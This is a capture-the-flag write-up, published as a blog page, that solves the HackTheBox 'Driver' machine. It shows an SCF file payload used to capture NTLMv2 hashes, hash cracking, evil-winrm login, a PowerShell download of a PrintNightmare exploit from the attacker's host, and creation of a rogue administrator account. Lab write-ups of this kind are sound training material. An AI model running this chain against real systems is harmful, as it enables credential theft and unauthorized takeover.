@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Driver Hackthebox writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/windows-machines/2022-02-25-driver/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Driver Hackthebox writeup">
+  <meta property="og:description" content="In this Box, we are going to abuse the ability of uploading the firmware of a shared printer and capture the NTLMv2 hash of a user on this machine. By cracking the hash there is nothing that can stop us from logging in except the smb shares aren’t accessible so we will use evil-winrm to get the initial access, for the Administrator part we will make use of the vulnerable service “spooler” and add a user in the administrator group.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-02-25T00:45:08+02:00">
+    <meta property="article:modified_time" content="2022-02-25T00:45:08+02:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Print Nigthmare">
+    <meta property="article:tag" content="Scf Attacks">
+    <meta property="article:tag" content="Evil-Winrm">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Driver Hackthebox writeup">
+  <meta name="twitter:description" content="In this Box, we are going to abuse the ability of uploading the firmware of a shared printer and capture the NTLMv2 hash of a user on this machine. By cracking the hash there is nothing that can stop us from logging in except the smb shares aren’t accessible so we will use evil-winrm to get the initial access, for the Administrator part we will make use of the vulnerable service “spooler” and add a user in the administrator group.">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/windows-machines/2022-02-25-driver/" /><link rel="prev" href="http://example.org/posts/linux-machines/2022-02-18-bolt/" /><link rel="next" href="http://example.org/posts/linux-machines/2022-03-11-devzat/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Driver Hackthebox writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/windows-machines\/2022-02-25-driver\/"
+        },"genre": "posts","keywords": "Hackthebox, print nigthmare, scf attacks, evil-winrm","wordcount":  867 ,
+        "url": "http:\/\/example.org\/posts\/windows-machines\/2022-02-25-driver\/","datePublished": "2022-02-25T00:45:08+02:00","dateModified": "2022-02-25T00:45:08+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Driver Hackthebox writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/windows-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-02-25">2022-02-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;867 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning-">Scanning :</a></li>
+    <li><a href="#enumeration">Enumeration:</a>
+      <ul>
+        <li><a href="#smb-authentication-">SMB authentication :</a></li>
+        <li><a href="#exploitation-">Exploitation :</a></li>
+      </ul>
+    </li>
+    <li><a href="#foothold-">Foothold :</a></li>
+    <li><a href="#privilege-escalation-">Privilege escalation :</a></li>
+    <li><a href="#pwned">Pwned</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>In this Box, we are going to abuse the ability of uploading the firmware of a shared printer and capture
+the NTLMv2 hash of a user on this machine. By cracking the hash there is nothing that can stop us from logging in
+except the smb shares aren&rsquo;t accessible so we will use evil-winrm to get the initial access, for the Administrator part we will make use of the vulnerable service &ldquo;spooler&rdquo; and add a user in the administrator group.</p>
+<h2 id="scanning-">Scanning :</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -T <span class="m">4</span> -A -sV 10.10.11.106  -oN nmap_intial.txt</span></span></code></pre></div></div>
+<p>output :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT    STATE SERVICE      VERSION
+</span></span><span class="line"><span class="cl">80/tcp  open  http         Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-auth:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized<span class="se">\x</span>0D
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Basic <span class="nv">realm</span><span class="o">=</span>MFP Firmware Update Center. Please enter password <span class="k">for</span> admin
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="se">\&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">135/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">445/tcp open  microsoft-ds Microsoft Windows <span class="m">7</span> - <span class="m">10</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: Host: DRIVER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 7h17m43s, deviation: 0s, median: 7h17m43s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required</span></span></code></pre></div></div>
+<p>we can also run full port scan and will get :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">80/tcp   open  http
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds
+</span></span><span class="line"><span class="cl">5985/tcp open  wsman</span></span></code></pre></div></div>
+<p>we have this port <strong>5985</strong> open , which we may utilize later <a href="https://hacktricks.boitatech.com.br/pentesting/5985-5986-pentesting-winrm" target="_blank" rel="noopener noreffer ">check</a>.</p>
+<h2 id="enumeration">Enumeration:</h2>
+<p>we can start by visiting the web page and it will ask us for a username:password for MFP firmware update center .</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Driver/20220226110700.png"
+        data-srcset="/assets/images/Driver/20220226110700.png, /assets/images/Driver/20220226110700.png 1.5x, /assets/images/Driver/20220226110700.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Driver/20220226110700.png"
+        title="image" /></p>
+<p>searching for MFP will find it stands for multi functioning printer , we can search for default credentials and find it is <strong>&ldquo;admin:admin&rdquo;</strong></p>
+<p>using them will login successfully :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Driver/20220226111149.png"
+        data-srcset="/assets/images/Driver/20220226111149.png, /assets/images/Driver/20220226111149.png 1.5x, /assets/images/Driver/20220226111149.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Driver/20220226111149.png"
+        title="image" /></p>
+<ul>
+<li>
+<p>we can add &ldquo;driver.htb&rdquo; to the <code>/etc/hosts</code> and start fuzzing for any Vhosts but will find none.</p>
+</li>
+<li>
+<p>let&rsquo;s navigate around this site will find option Firmware Updates is working and asking for updating firmware</p>
+</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Driver/20220226111320.png"
+        data-srcset="/assets/images/Driver/20220226111320.png, /assets/images/Driver/20220226111320.png 1.5x, /assets/images/Driver/20220226111320.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Driver/20220226111320.png"
+        title="image" /></p>
+<ul>
+<li>
+<p>we should now think about uploading some malicious file to gain a reverse shell , however it won&rsquo;t work.</p>
+</li>
+<li>
+<p>we can enumerate SMB that we have found earlier maybe will give us a lead</p>
+</li>
+<li>
+<p>ACCESS_DENIED from <code>smbclient -L //driver.htb</code></p>
+</li>
+<li>
+<p>it seems SMB is running for the printer that is shared among the network</p>
+</li>
+</ul>
+<h3 id="smb-authentication-">SMB authentication :</h3>
+<ul>
+<li>according to Microsoft Documentation :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>NTLM and the older LAN Manager (LM) encryption are supported by Microsoft SMB Protocol. Both encryption methods use challenge-response authentication, where the server sends the client a random string and the client returns a computed response string that proves the client has sufficient credentials for access.</code></pre></div>
+<ul>
+<li>
+<p>so if the client (the target) tries to connect to us (attacker) the NTLM hash will be used to authenticate and then we can capture it with <a href="https://github.com/lgandx/Responder" target="_blank" rel="noopener noreffer ">Responder</a> tool.</p>
+</li>
+<li>
+<p>and as the firmwares are checked when the file we upload is loaded at the reviewer file explorer or if he clicked it we can get the hash we need.</p>
+</li>
+</ul>
+<h3 id="exploitation-">Exploitation :</h3>
+<ul>
+<li>searching for &ldquo;smb share and printer firmware update exploit&rdquo; will find this blog <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" target="_blank" rel="noopener noreffer ">here</a></li>
+<li>so creating the payload :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-cmd">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">[Shell]
+</span></span><span class="line"><span class="cl">Command=2
+</span></span><span class="line"><span class="cl">IconFile=\\<span class="p">&lt;</span>ip<span class="p">&gt;</span>\share\Mesbaha.ico
+</span></span><span class="line"><span class="cl">[Taskbar]
+</span></span><span class="line"><span class="cl">Command=ToggleDesktop</span></span></code></pre></div></div>
+<p>and name it as <code>&quot;@hack.scf&quot;</code> and before uploading it run Responder to capture the hash (hopefully):</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo responder -I tun0 -rdwv</span></span></code></pre></div></div>
+<p>GREAT we have NTLMv2 hash now :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Driver/20220226114609.png"
+        data-srcset="/assets/images/Driver/20220226114609.png, /assets/images/Driver/20220226114609.png 1.5x, /assets/images/Driver/20220226114609.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Driver/20220226114609.png"
+        title="image" /></p>
+<p>now we can try to crack it with hashcat :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">5600</span> tony_hash  /usr/share/wordlists/rockyou.txt</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Driver/20220226114733.png"
+        data-srcset="/assets/images/Driver/20220226114733.png, /assets/images/Driver/20220226114733.png 1.5x, /assets/images/Driver/20220226114733.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Driver/20220226114733.png"
+        title="image" /></p>
+<p>so we have username and password , now How can we login ?</p>
+<h2 id="foothold-">Foothold :</h2>
+<ul>
+<li>Most of the <strong>impacket</strong> tools that takes username:password and try to login depends on SMB shares (i.e : <code>ADMIN$</code> and <code>C$</code>) and hence they are not accessible they won&rsquo;t work .</li>
+<li>Remember the port we have found in the full port scan ?</li>
+<li>reading the blog article i have mentioned above</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>If WinRM is enabled on the machine, it&#39;s trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)</code></pre></div>
+<ul>
+<li>and they mentioned tool : <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreffer ">evil-winrm</a> that can help us do this</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./evil-winrm.rb -u tony -p liltony -i driver.htb</span></span></code></pre></div></div>
+<ul>
+<li>and the user.txt is in tony&rsquo;s Desktop</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Driver/20220226115238.png"
+        data-srcset="/assets/images/Driver/20220226115238.png, /assets/images/Driver/20220226115238.png 1.5x, /assets/images/Driver/20220226115238.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Driver/20220226115238.png"
+        title="image" /></p>
+<h2 id="privilege-escalation-">Privilege escalation :</h2>
+<ul>
+<li>you can start uploading Winpeas and follow the output but i will try first some manual checks</li>
+<li>first we know this Box is about printers and drivers maybe we find some exploit that way</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Driver/20220226115603.png"
+        data-srcset="/assets/images/Driver/20220226115603.png, /assets/images/Driver/20220226115603.png 1.5x, /assets/images/Driver/20220226115603.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Driver/20220226115603.png"
+        title="image" /></p>
+<ul>
+<li>in the Microsoft post is says we can run <code>Get-Service -Name Spooler </code> to check if it is running , and it is running</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Driver/20220226115710.png"
+        data-srcset="/assets/images/Driver/20220226115710.png, /assets/images/Driver/20220226115710.png 1.5x, /assets/images/Driver/20220226115710.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Driver/20220226115710.png"
+        title="image" /></p>
+<ul>
+<li>Hence the service is running indeed we can try to exploit it and see if it works , there is this great one <a href="https://github.com/JohnHammond/CVE-2021-34527" target="_blank" rel="noopener noreffer ">here</a> that we can try</li>
+<li>we can try to upload it then it will add for us a new user in Administrator group</li>
+<li>from machine side we can download the script from our http server with :</li>
+<li><strong>note</strong> make sure you are in a writable directory</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Invoke-WebRequest -Uri http://10.10.16.4:8888/CVE-2021-34527.ps1 -OutFile CVE.ps1</span></span></code></pre></div></div>
+<ul>
+<li>running the exploit :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">CVE</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Nightmare</span> <span class="n">-NewUser</span> <span class="s2">&#34;0xMesbaha&#34;</span> <span class="n">-NewPassword</span> <span class="s2">&#34;supersecretpassword123&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Driver/20220226120617.png"
+        data-srcset="/assets/images/Driver/20220226120617.png, /assets/images/Driver/20220226120617.png 1.5x, /assets/images/Driver/20220226120617.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Driver/20220226120617.png"
+        title="image" /></p>
+<p>and our new user has been added we can try to login with &ldquo;evil-winrm&rdquo; as well :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Driver/20220226120835.png"
+        data-srcset="/assets/images/Driver/20220226120835.png, /assets/images/Driver/20220226120835.png 1.5x, /assets/images/Driver/20220226120835.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Driver/20220226120835.png"
+        title="image" /></p>
+<p>and if we run <code>net user &lt;user_added&gt;</code> will find :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/Driver/20220226120902.png"
+        data-srcset="/assets/images/Driver/20220226120902.png, /assets/images/Driver/20220226120902.png 1.5x, /assets/images/Driver/20220226120902.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/Driver/20220226120902.png"
+        title="image" /></p>
+<p>the root flag is at Administrator Desktop .</p>
+<h2 id="pwned">Pwned</h2></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-02-25</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/windows-machines/2022-02-25-driver/" data-title="Driver Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,print nigthmare,scf attacks,evil-winrm"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/windows-machines/2022-02-25-driver/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/windows-machines/2022-02-25-driver/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2fwindows-machines%2f2022-02-25-driver%2f&amp;text=Driver%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">Hackthebox</a>,&nbsp;<a href="/tags/print-nigthmare/">Print Nigthmare</a>,&nbsp;<a href="/tags/scf-attacks/">Scf Attacks</a>,&nbsp;<a href="/tags/evil-winrm/">Evil-Winrm</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/linux-machines/2022-02-18-bolt/" class="prev" rel="prev" title="Bolt Hackthebox writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Bolt Hackthebox writeup</a>
+            <a href="/posts/linux-machines/2022-03-11-devzat/" class="next" rel="next" title="Devzat Hackthebox writeup">Devzat Hackthebox writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
